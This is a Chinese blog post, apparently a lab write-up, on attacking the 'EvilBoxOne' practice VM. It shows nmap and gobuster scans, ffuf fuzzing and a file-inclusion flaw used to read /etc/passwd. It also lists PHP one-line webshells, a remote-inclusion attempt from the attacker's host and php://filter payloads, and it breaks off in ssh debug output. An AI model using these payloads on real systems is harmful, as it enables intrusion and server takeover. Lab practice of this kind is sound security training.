@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="e1iwRhdDRUGkBandwtaXVgqhNwYn1qtFuAYbOSPWpcI">
+  <meta name="baidu-site-verification" content="code-NObBqxefR1">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="gobuster目录扫描 | ffuf参数fuzz | 文件包含 | php封装器 | ssh私钥读取 | ssh私钥爆破 | 写入&#x2F;etc&#x2F;passwd提权">
+<meta property="og:type" content="article">
+<meta property="og:title" content="打靶练习6-EvilBoxOne">
+<meta property="og:url" content="http://example.com/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A06-EvilBoxOne/index.html">
+<meta property="og:site_name" content="ShadowFl0w">
+<meta property="og:description" content="gobuster目录扫描 | ffuf参数fuzz | 文件包含 | php封装器 | ssh私钥读取 | ssh私钥爆破 | 写入&#x2F;etc&#x2F;passwd提权">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-11-18T01:38:12.000Z">
+<meta property="article:modified_time" content="2022-11-19T04:13:49.051Z">
+<meta property="article:author" content="ShadowFl0w">
+<meta property="article:tag" content="打靶">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A06-EvilBoxOne/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>打靶练习6-EvilBoxOne | ShadowFl0w</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ShadowFl0w</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">Nothing</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/%E6%89%93%E9%9D%B6%E7%BB%83%E4%B9%A06-EvilBoxOne/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.jpeg">
+      <meta itemprop="name" content="ShadowFl0w">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ShadowFl0w">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          打靶练习6-EvilBoxOne
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-11-18 09:38:12" itemprop="dateCreated datePublished" datetime="2022-11-18T09:38:12+08:00">2022-11-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-11-19 12:13:49" itemprop="dateModified" datetime="2022-11-19T12:13:49+08:00">2022-11-19</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BA%A2%E9%98%9F%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index"><span itemprop="name">红队技术</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>gobuster目录扫描 | ffuf参数fuzz | 文件包含 | php封装器 | ssh私钥读取 | ssh私钥爆破 | 写入/etc/passwd提权</p>
+<span id="more"></span>
+
+
+
+
+<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><p>ping网段</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fping -gaq <span class="number">172</span>.<span class="number">16</span>.<span class="number">42</span>.<span class="number">0</span>/<span class="number">24</span></span><br><span class="line"></span><br><span class="line"><span class="number">172.16.42.1</span></span><br><span class="line"><span class="number">172.16.42.147</span></span><br><span class="line"><span class="number">172.16.42.206</span></span><br><span class="line"></span><br><span class="line">确认主机<span class="number">172</span>.<span class="number">16</span>.<span class="number">42</span>.<span class="number">206</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>nmap全端口扫描</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -p- <span class="number">172.16</span><span class="number">.42</span><span class="number">.206</span></span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">22</span>/tcp <span class="built_in">open</span>  ssh</span><br><span class="line"><span class="number">80</span>/tcp <span class="built_in">open</span>  <span class="keyword">http</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>服务识别</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sudo</span> nmap -p<span class="number">22</span>,<span class="number">80</span> -A <span class="number">172.16.42.206</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">PORT</span>   STATE SERVICE VERSION</span><br><span class="line"><span class="attribute">22</span>/tcp open  ssh     OpenSSH <span class="number">7</span>.<span class="number">9</span>p<span class="number">1</span> Debian <span class="number">10</span>+deb<span class="number">10</span>u<span class="number">2</span> (protocol <span class="number">2</span>.<span class="number">0</span>)</span><br><span class="line"><span class="attribute">80</span>/tcp open  http    Apache httpd <span class="number">2</span>.<span class="number">4</span>.<span class="number">38</span> ((Debian))</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="web入侵"><a href="#web入侵" class="headerlink" title="web入侵"></a>web入侵</h2><h3 id="gobuster目录扫描"><a href="#gobuster目录扫描" class="headerlink" title="gobuster目录扫描"></a>gobuster目录扫描</h3><p>使用seclists字典</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/ -w /u</span>sr<span class="regexp">/share/</span>seclists<span class="regexp">/Discovery/</span>Web-Content/directory-list-<span class="number">1.0</span>.txt -x txt,php,html,jsp</span><br></pre></td></tr></table></figure>
+
+<p>发现secret目录，继续在secret目录下目录爆破</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret -w /u</span>sr<span class="regexp">/share/</span>seclists<span class="regexp">/Discovery/</span>Web-Content/directory-list-<span class="number">1.0</span>.txt -x txt,php,html,jsp</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="参数fuzz"><a href="#参数fuzz" class="headerlink" title="参数fuzz"></a>参数fuzz</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w <span class="regexp">/usr/</span>share<span class="regexp">/seclists/</span>Discovery<span class="regexp">/Web-Content/</span>burp-parameter-names.txt:PARAM -w ~<span class="regexp">/pentest/</span>wordlist<span class="regexp">/shadowflow/</span>para-value.txt:VAL -u http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret/</span>evil.php\?PARAM\=VAL -fs <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>未发现可用参数</p>
+<h3 id="测试文件包含"><a href="#测试文件包含" class="headerlink" title="测试文件包含"></a>测试文件包含</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w <span class="regexp">/usr/</span>share<span class="regexp">/seclists/</span>Discovery<span class="regexp">/Web-Content/</span>burp-parameter-names.txt -u http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret/</span>evil.php\?FUZZ=../index.html -fs <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>fuzz出了command，任意文件读取</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/172.16.42.206/secret</span><span class="regexp">/evil.php?command=../</span>../../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span> <span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span> <span class="symbol">games:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">60</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">man:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:man</span><span class="symbol">:/var/cache/man</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">lp:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:lp</span><span class="symbol">:/var/spool/lpd</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">mail:</span><span class="symbol">x:</span><span class="number">8</span><span class="symbol">:</span><span class="number">8</span><span class="symbol">:mail</span><span class="symbol">:/var/mail</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">news:</span><span class="symbol">x:</span><span class="number">9</span><span class="symbol">:</span><span class="number">9</span><span class="symbol">:news</span><span class="symbol">:/var/spool/news</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">10</span><span class="symbol">:uucp</span><span class="symbol">:/var/spool/uucp</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:proxy</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span> www-<span class="symbol">data:</span><span class="symbol">x:</span><span class="number">33</span><span class="symbol">:</span><span class="number">33</span><span class="symbol">:www-data</span><span class="symbol">:/var/www</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">backup:</span><span class="symbol">x:</span><span class="number">34</span><span class="symbol">:</span><span class="number">34</span><span class="symbol">:backup</span><span class="symbol">:/var/backups</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">list:</span><span class="symbol">x:</span><span class="number">38</span><span class="symbol">:</span><span class="number">38</span><span class="symbol">:Mailing</span> List <span class="symbol">Manager:</span>/var/<span class="symbol">list:</span>/usr/sbin/nologin <span class="symbol">irc:</span><span class="symbol">x:</span><span class="number">39</span><span class="symbol">:</span><span class="number">39</span><span class="symbol">:ircd</span><span class="symbol">:/var/run/ircd</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">gnats:</span><span class="symbol">x:</span><span class="number">41</span><span class="symbol">:</span><span class="number">41</span><span class="symbol">:Gnats</span> Bug-Reporting System (admin)<span class="symbol">:/var/lib/gnats</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">nobody:</span><span class="symbol">x:</span><span class="number">65534</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:nobody</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">_apt:</span><span class="symbol">x:</span><span class="number">100</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span> systemd-<span class="symbol">timesync:</span><span class="symbol">x:</span><span class="number">101</span><span class="symbol">:</span><span class="number">102</span><span class="symbol">:systemd</span> Time Synchronization,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span> systemd-<span class="symbol">network:</span><span class="symbol">x:</span><span class="number">102</span><span class="symbol">:</span><span class="number">103</span><span class="symbol">:systemd</span> Network Management,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span> systemd-<span class="symbol">resolve:</span><span class="symbol">x:</span><span class="number">103</span><span class="symbol">:</span><span class="number">104</span><span class="symbol">:systemd</span> Resolver,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">messagebus:</span><span class="symbol">x:</span><span class="number">104</span><span class="symbol">:</span><span class="number">110</span><span class="symbol">:</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">sshd:</span><span class="symbol">x:</span><span class="number">105</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:</span><span class="symbol">:/run/sshd</span><span class="symbol">:/usr/sbin/nologin</span> <span class="symbol">mowree:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:mowree</span>,,,<span class="symbol">:/home/mowree</span><span class="symbol">:/bin/bash</span> systemd-<span class="symbol">coredump:</span><span class="symbol">x:</span><span class="number">999</span><span class="symbol">:</span><span class="number">999</span><span class="symbol">:systemd</span> Core <span class="symbol">Dumper:</span>/<span class="symbol">:/usr/sbin/nologin</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>自己kali放入一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;123&#x27;</span>])<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;123&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$var</span>=shell_exec(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="keyword">echo</span> <span class="variable">$var</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我这里使用<code>&lt;?php $var=shell_exec($_GET[&#39;cmd&#39;]); echo $var ?&gt;</code></p>
+<p><code>http://172.16.42.206/secret/evil.php?command=http://172.16.42.147/a.php?cmd=id</code>，失败</p>
+<h3 id="php封装器"><a href="#php封装器" class="headerlink" title="php封装器"></a>php封装器</h3><p>默认包含了很多封装器/协议，比如php 、file、ftp、data、zip等。</p>
+<p>通过php封装器读取源码</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret/</span>evil.php?command=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=evil.php</span><br></pre></td></tr></table></figure>
+
+<p>结果</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKICAgICRmaWxlbmFtZSA9ICRfR0VUWydjb21tYW5kJ107CiAgICBpbmNsdWRlKCRmaWxlbmFtZSk7Cj8+<span class="attribute">Cg</span>==</span><br></pre></td></tr></table></figure>
+
+<p>解码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;command&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>尝试写入php文件</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@kali html]<span class="comment"># echo -n 123 | base64</span></span><br><span class="line">MTIz</span><br><span class="line"></span><br><span class="line"><span class="comment">#发起http请求写入</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret/</span>evil.php?command=php:<span class="regexp">//</span>filter<span class="regexp">/write=convert.base64-decode/</span>resource=test.php&amp;txt=MTIz</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取</span></span><br><span class="line">http:<span class="regexp">//</span><span class="number">172.16</span>.<span class="number">42.206</span><span class="regexp">/secret/</span>evil.php?command=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=test.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#并没有读取到，说明不成功。</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="ssh秘钥获取"><a href="#ssh秘钥获取" class="headerlink" title="ssh秘钥获取"></a>ssh秘钥获取</h3><p>通过读取/etc/passwd文件，发现有mowree用户。</p>
+<p>ssh登录尝试，-v参数收集认证信息<code>ssh mowree@172.16.42.206 -v</code></p>
+<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">[root@kali html]# ssh mowree@<span class="number">172.16</span>.<span class="number">42.206</span> -v</span><br><span class="line">OpenSSH_8.<span class="number">4</span>p1 Debian-<span class="number">6</span>, OpenSSL <span class="number">1.1</span>.<span class="number">1i</span>  <span class="number">8</span> Dec <span class="number">2020</span></span><br><span class="line"><span class="symbol">debug1:</span> Reading configuration data /etc/ssh/ssh_config</span><br><span class="line"><span class="symbol">debug1:</span> /etc/ssh/ssh_config line <span class="number">19</span>: Applying options <span class="keyword">for</span> *</span><br><span class="line"><span class="symbol">debug1:</span> Connecting <span class="keyword">to</span> <span class="number">172.16</span>.<span class="number">42.206</span> [<span class="number">172.16</span>.<span class="number">42.206</span>] port <span class="number">22</span>.</span><br><span class="line"><span class="symbol">debug1:</span> Connection established.</span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_rsa type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_rsa-cert type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_dsa type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_dsa-cert type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ecdsa type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ecdsa-cert type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ecdsa_sk type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ecdsa_sk-cert type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ed25519 type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ed25519-cert type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ed25519_sk type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_ed25519_sk-cert type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_xmss type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> identity file /root/.ssh/id_xmss-cert type -<span class="number">1</span></span><br><span class="line"><span class="symbol">debug1:</span> Local version <span class="type">string</span> SSH-<span class="number">2.0</span>-OpenSSH_8.<span class="number">4</span>p1 Debian-<span class="number">6</span></span><br><span class="line"><span class="symbol">debug1:</span> Remote protocol version <span class="number">2.0</span>, remote software version OpenSSH_7.<span class="number">9</span>p1 Debian-<span class="number">10</span>+deb10u2</span><br><span class="line"><span class="symbol">debug1:</span> match: OpenSSH_7.<span class="number">9</span>p1 Debian-<span class="number">10</span>+deb10u2 pat OpenSSH* compat <span class="number">0</span>x04000000</span><br><span class="line"><span class="symbol">debug1:</span> Authenticating <span class="keyword">to</span> <span class="number">172.16</span>.<span class="number">42.206</span>:<span class="number">22</span> <span class="keyword">as</span> <span class="comment">&#x27;mowree&#x27;</span></span><br><span class="line"><span class="symbol">debug1:</span> SSH2_MSG_KEXINIT sent</span><br><span class="line"><span class="symbol">debug1:</span> SSH2_MSG_KEXINIT received</span><br><span class="line"><span class="symbol">debug1:</span> kex: algorithm: curve25519-sha256</span><br><span class="line"><span class="symbol">debug1:</span> kex: host <span class="keyword">key</span> algorithm: ecdsa-sha2-nistp256</span><br><span class="line"><span class="symbol">debug1:</span> kex: server-&gt;client cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line"><span class="symbol">debug1:</span> kex: client-&gt;server cipher: chacha20-poly1305@openssh.com MAC: &lt;implicit&gt; compression: none</span><br><span class="line"><span class="symbol">debug1:</span> expecting SSH2_MSG_KEX_ECDH_REPLY</span><br><span class="line"><span class="symbol">debug1:</span> Server host <span class="keyword">key</span>: ecdsa-sha2-nistp256 SHA256:cd9WCNmPY0i3zsZaPEV0qa7yp5hz8+TVNalFULd5CwM</span><br><span class="line"><span class="symbol">debug1:</span> Host <span class="comment">&#x27;172.16.42.206&#x27; is known and matches the ECDSA host key.</span></span><br><span class="line"><span class="symbol">debug1:</span> Found <span class="keyword">key</span> <span class="keyword">in</span> /root/.ssh/known_hosts:<span class="number">4</span></span><br><span class="line"><span class="symbol">debug1:</span> rekey out after <span class="number">134217728</span> blocks</span><br><span class="line"><span 